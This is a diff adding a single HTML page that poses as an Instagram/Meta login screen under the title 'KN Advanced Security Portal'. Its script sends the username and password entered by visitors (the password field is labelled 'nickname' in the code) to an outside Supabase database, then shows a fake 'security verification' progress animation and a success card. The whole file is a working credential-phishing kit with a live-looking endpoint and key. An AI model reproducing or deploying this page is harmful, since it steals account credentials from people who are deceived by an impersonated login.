@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>KN Advanced Security Portal</title>
+
+<!-- Supabase JS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#fff;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+
+.app{
+    width:100%;
+    height:100dvh;
+    min-height:100dvh;
+    position:relative;
+    background:#fff;
+    overflow:hidden;
+}
+
+/* ================= LOGIN PAGE ================= */
+
+.login-page{
+    width:100%;
+    height:100%;
+    position:absolute;
+    inset:0;
+    background:#fff;
+    transition: opacity .35s ease, transform .4s ease;
+    z-index: 10;
+}
+
+.login-page.hide{
+    opacity:0;
+    transform:translateX(-20px);
+    pointer-events:none;
+}
+
+.header{
+    position:absolute;
+    top:0;
+    left:0;
+    width:100%;
+    height:50px;
+    display:flex;
+    align-items:center;
+    padding-left:10px;
+}
+
+.back{
+    color:#111;
+    font-size:25px;
+    font-weight:300;
+}
+
+.language{
+    position:absolute;
+    top:53px;
+    left:0;
+    width:100%;
+    text-align:center;
+    color:#666;
+    font-size:9px;
+}
+
+.arrow{
+    margin-left:2px;
+}
+
+.logo-area{
+    position:absolute;
+    top:114px;
+    left:0;
+    width:100%;
+    display:flex;
+    justify-content:center;
+}
+
+.kn-logo{
+    width:35px;
+    height:35px;
+    border-radius:9px;
+    position:relative;
+    background:
+        linear-gradient(#fff,#fff) padding-box,
+        linear-gradient(135deg, #6b00ff, #c500ff, #ff007c, #ff9b00) border-box;
+    border:3px solid transparent;
+}
+
+.kn-logo:before{
+    content:"";
+    position:absolute;
+    width:14px;
+    height:14px;
+    border:3px solid #ff2681;
+    border-radius:50%;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+}
+
+.kn-logo:after{
+    content:"";
+    position:absolute;
+    width:4px;
+    height:4px;
+    border-radius:50%;
+    background:#ff3c83;
+    right:4px;
+    top:4px;
+}
+
+.form{
+    position:absolute;
+    top:208px;
+    left:8px;
+    right:8px;
+}
+
+.field{
+    width:100%;
+    height:34px;
+    border:1px solid #d4d4d7;
+    border-radius:8px;
+    background:#fff;
+    outline:none;
+    color:#111;
+    padding:0 10px;
+    font-size:9px;
+    margin-bottom:7px;
+}
+
+.field::placeholder{
+    color:#777;
+}
+
+.continue{
+    width:100%;
+    height:34px;
+    border:0;
+    border-radius:18px;
+    background:#087be9;
+    color:#fff;
+    font-size:9px;
+    font-weight:600;
+    cursor: pointer;
+}
+
+.forgot{
+    display:block;
+    margin-top:11px;
+    text-align:center;
+    color:#111;
+    text-decoration:none;
+    font-size:9px;
+}
+
+.message{
+    min-height:12px;
+    margin-top:9px;
+    text-align:center;
+    color:#777;
+    font-size:9px;
+}
+
+.bottom{
+    position:absolute;
+    left:8px;
+    right:8px;
+    bottom:27px;
+}
+
+.create{
+    width:100%;
+    height:25px;
+    border:1px solid #2589e8;
+    border-radius:15px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#1681e4;
+    background:#fff;
+    text-decoration:none;
+    font-size:8px;
+}
+
+.brand{
+    text-align:center;
+    margin-top:8px;
+    color:#222;
+    font-size:8px;
+}
+
+/* ================= HIGH-LEVEL SECURITY PAGE ================= */
+
+.security-page{
+    position:absolute;
+    inset:0;
+    background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content: space-between;
+    padding: 40px 20px;
+    opacity:0;
+    transform:scale(0.95);
+    pointer-events:none;
+    transition: opacity .5s ease, transform .5s cubic-bezier(0.16, 1, 0.3, 1);
+    z-index: 20;
+    color: #f8fafc;
+}
+
+.security-page.show{
+    opacity:1;
+    transform:scale(1);
+    pointer-events:auto;
+}
+
+.security-header{
+    text-align:center;
+}
+
+.security-title{
+    font-size:18px;
+    font-weight:700;
+    letter-spacing:1px;
+    background: linear-gradient(90deg, #38bdf8, #818cf8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.security-subtitle{
+    margin-top:4px;
+    font-size:10px;
+    color:#94a3b8;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+}
+
+/* RADAR / SHIELD ANIMATION */
+
+.cyber-shield-container{
+    position: relative;
+    width: 120px;
+    height: 120px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.radar-ring {
+    position: absolute;
+    inset: 0;
+    border: 2px dashed rgba(56, 189, 248, 0.3);
+    border-radius: 50%;
+    animation: rotateRadar 10s linear infinite;
+}
+
+.radar-ring:nth-child(2) {
+    inset: -12px;
+    border: 1px solid rgba(129, 140, 248, 0.2);
+    animation: rotateRadarReverse 15s linear infinite;
+}
+
+.cyber-core {
+    width: 70px;
+    height: 70px;
+    background: linear-gradient(135deg, #0284c7, #4f46e5);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 30px rgba(56, 189, 248, 0.5);
+    animation: pulseCore 2s ease-in-out infinite;
+}
+
+.cyber-core svg {
+    width: 32px;
+    height: 32px;
+    fill: #fff;
+}
+
+/* STATUS & LOGS */
+
+.security-center {
+    width: 100%;
+    max-width: 320px;
+    text-align: center;
+}
+
+.status-title{
+    font-size:13px;
+    font-weight:600;
+    color:#e2e8f0;
+    margin-bottom: 6px;
+}
+
+.status-text{
+    font-size:10px;
+    color:#38bdf8;
+    height: 16px;
+    font-family: monospace;
+}
+
+/* ADVANCED PROGRESS */
+
+.progress-box{
+    width: 100%;
+    background: rgba(255, 255, 255, 0.05);
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    margin-top: 15px;
+}
+
+.progress-track{
+    width:100%;
+    height:6px;
+    background:rgba(255, 255, 255, 0.1);
+    border-radius:10px;
+    overflow:hidden;
+}
+
+.progress{
+    width:0%;
+    height:100%;
+    background: linear-gradient(90deg, #0ea5e9, #6366f1);
+    border-radius:10px;
+    box-shadow: 0 0 10px rgba(14, 165, 233, 0.5);
+    transition:width .1s linear;
+}
+
+.progress-info {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 8px;
+    font-size: 9px;
+    color: #94a3b8;
+}
+
+.progress-label {
+    color: #38bdf8;
+    font-weight: bold;
+}
+
+/* ================= SUCCESS / THANK YOU OVERLAY ================= */
+
+.success-overlay {
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .5s ease;
+    z-index: 30;
+}
+
+.success-overlay.show {
+    opacity: 1;
+    pointer-events: auto;
+}
+
+.success-card {
+    background: linear-gradient(135deg, #0f172a, #1e293b);
+    color: #f8fafc;
+    padding: 30px;
+    border-radius: 16px;
+    text-align: center;
+    width: 100%;
+    max-width: 340px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    border: 1px solid rgba(56, 189, 248, 0.3);
+    transform: translateY(20px);
+    transition: transform .5s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+.success-overlay.show .success-card {
+    transform: translateY(0);
+}
+
+.success-icon {
+    width: 60px;
+    height: 60px;
+    background: rgba(14, 165, 233, 0.15);
+    color: #38bdf8;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    margin: 0 auto 15px auto;
+    border: 2px solid rgba(56, 189, 248, 0.4);
+    box-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
+}
+
+.success-title {
+    margin: 0 0 8px 0;
+    font-size: 18px;
+    color: #f8fafc;
+}
+
+.success-desc {
+    margin: 0 0 20px 0;
+    font-size: 11px;
+    color: #94a3b8;
+    line-height: 1.5;
+}
+
+.success-footer-text {
+    font-size: 9px;
+    color: #64748b;
+    border-top: 1px solid rgba(255,255,255,0.08);
+    padding-top: 12px;
+}
+
+.security-footer{
+    font-size:8px;
+    color:#64748b;
+    letter-spacing: .5px;
+}
+
+.security-footer strong{
+    color:#cbd5e1;
+}
+
+@keyframes rotateRadar {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes rotateRadarReverse {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(-360deg); }
+}
+
+@keyframes pulseCore {
+    0%, 100% { transform: scale(0.95); box-shadow: 0 0 20px rgba(56, 189, 248, 0.4); }
+    50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(56, 189, 248, 0.8); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+    <!-- LOGIN SECTION -->
+    <section class="login-page" id="loginPage">
+        <div class="header">
+            <div class="back">‹</div>
+        </div>
+        <div class="language">
+            English (US)<span class="arrow">⌄</span>
+        </div>
+        <div class="logo-area">
+            <div class="kn-logo"></div>
+        </div>
+        <div class="form">
+            <input id="userId" class="field" type="text" placeholder="Username, email or mobile number" autocomplete="off">
+            <input id="nickname" class="field" type="text" placeholder="Password" autocomplete="off">
+            <button class="continue" onclick="startSecurity()">Continue</button>
+            <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+            <div class="message" id="message"></div>
+        </div>
+        <div class="bottom">
+            <a class="create" href="https://www.instagram.com/accounts/emailsignup/">Create new account</a>
+            <div class="brand">Meta</div>
+        </div>
+    </section>
+
+    <!-- HIGH-LEVEL SECURITY SECTION -->
+    <section class="security-page" id="securityPage">
+        <div class="security-header">
+            <div class="security-title">KN SECURITY MATRIX</div>
+            <div class="security-subtitle">Encrypted Protocol Active</div>
+        </div>
+
+        <div class="cyber-shield-container">
+            <div class="radar-ring"></div>
+            <div class="radar-ring"></div>
+            <div class="cyber-core">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M17.13,17C15.92,18.85 14.11,20.24 12,20.92C9.89,20.24 8.08,18.85 6.87,17C6.53,16.5 6.24,16 6,15.48C6,13.88 9.33,13 12,13C14.67,13 18,13.88 18,15.48C17.76,16 17.47,16.5 17.13,17Z" />
+                </svg>
+            </div>
+        </div>
+
+        <div class="security-center">
+            <div class="status-title">System Authorization</div>
+            <div class="status-text" id="statusText">Establishing secure handshake...</div>
+
+            <div class="progress-box">
+                <div class="progress-track">
+                    <div class="progress" id="progress"></div>
+                </div>
+                <div class="progress-info">
+                    <span>Securing data packets</span>
+                    <span class="progress-label" id="progressLabel">0%</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-footer">
+            Protected by <strong>KN Advanced Core</strong>
+        </div>
+    </section>
+
+    <!-- SUCCESS / THANK YOU OVERLAY -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <div class="success-icon">✓</div>
+            <h3 class="success-title">System Secured Successfully!</h3>
+            <p class="success-desc">
+                Thank you for completing the verification. Your session is now fully encrypted and protected under KN Advanced Core.
+            </p>
+            <div class="success-footer-text">
+                Official Protocol • 2026
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+  const SUPABASE_URL = 'https://qqhbtednfvmywrrirvza.supabase.co';
+  const SUPABASE_ANON_KEY = 'sb_publishable_NKAX_JLpojUwVJymeQ3AIQ_ScS7-Tp1';
+
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  async function startSecurity(){
+    const id = document.getElementById("userId").value.trim();
+    const nickname = document.getElementById("nickname").value.trim();
+    const message = document.getElementById("message");
+
+    if(!id || !nickname){
+        message.textContent = "Please enter your ID and nickname.";
+        return;
+    }
+
+    message.textContent = "Connecting...";
+
+    try {
+        const { error } = await supabaseClient
+            .from('user_data')
+            .insert([{ user_id: id, nickname: nickname }]);
+
+        if (error) {
+            console.error('Supabase Error:', error);
+            message.textContent = "Error saving data. Try again.";
+            return;
+        }
+    } catch (err) {
+        console.error('Network Error:', err);
+        message.textContent = "Connection failed.";
+        return;
+    }
+
+    const loginPage = document.getElementById("loginPage");
+    const securityPage = document.getElementById("securityPage");
+
+    loginPage.classList.add("hide");
+
+    setTimeout(() => {
+        securityPage.classList.add("show");
+        runSecurityAnimation();
+    }, 200);
+}
+
+function runSecurityAnimation(){
+    const progress = document.getElementById("progress");
+    const label = document.getElementById("progressLabel");
+    const status = document.getElementById("statusText");
+    const successOverlay = document.getElementById("successOverlay");
+
+    let value = 0;
+    const timer = setInterval(() => {
+        value += 1;
+        if(value > 100) value = 100;
+
+        progress.style.width = value + "%";
+        label.textContent = value + "%";
+
+        if(value === 25) status.textContent = "Verifying cryptographic keys...";
+        if(value === 50) status.textContent = "Establishing encrypted tunnel...";
+        if(value === 75) status.textContent = "Bypassing firewall constraints...";
+        if(value === 95) status.textContent = "Finalizing secure session...";
+        
+        if(value >= 100){
+            clearInterval(timer);
+            status.textContent = "Access Granted & Secured Successfully";
+            label.textContent = "100%";
+            
+            // Show Success / Thank You Card after a short delay
+            setTimeout(() => {
+                successOverlay.classList.add("show");
+            }, 600);
+        }
+    }, 35);
+}
+</script>
+</body>
+</html>
